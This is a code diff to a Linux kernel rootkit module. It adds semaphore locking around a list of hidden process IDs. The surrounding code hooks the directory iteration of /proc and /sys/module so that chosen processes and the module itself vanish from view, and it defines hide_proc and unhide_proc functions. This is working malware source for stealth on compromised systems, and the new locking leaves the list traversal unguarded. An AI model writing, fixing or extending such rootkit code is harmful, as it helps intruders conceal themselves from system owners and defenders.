@@ -3,6 +3,7 @@
 extern u8 module_hidden;
 
 LIST_HEAD(hidden_pid_list);
+struct semaphore hidden_pid_list_sem;
 
 struct hidden_pid_t
 {
@@ -65,6 +66,7 @@ int hidefs_init(void)
     SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
     SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);
 
+    sema_init(&hidden_pid_list_sem, 1);
     return 0;
 }
 
@@ -84,7 +86,9 @@ void hide_proc(pid_t pid)
     hidden_pid->pid = pid;
     INIT_LIST_HEAD(&(hidden_pid->list));
 
+    down(&hidden_pid_list_sem);
     list_add(&hidden_pid->list, &hidden_pid_list);
+    up(&hidden_pid_list_sem);
 }
 
 void unhide_proc(pid_t pid)
@@ -97,7 +101,10 @@ void unhide_proc(pid_t pid)
         hidden_pid = list_entry(pos, struct hidden_pid_t, list);
         if (hidden_pid->pid == pid)
         {
+            down(&hidden_pid_list_sem);
             list_del(&hidden_pid->list);
+            up(&hidden_pid_list_sem);
+
             kfree(hidden_pid);
             return;
         }
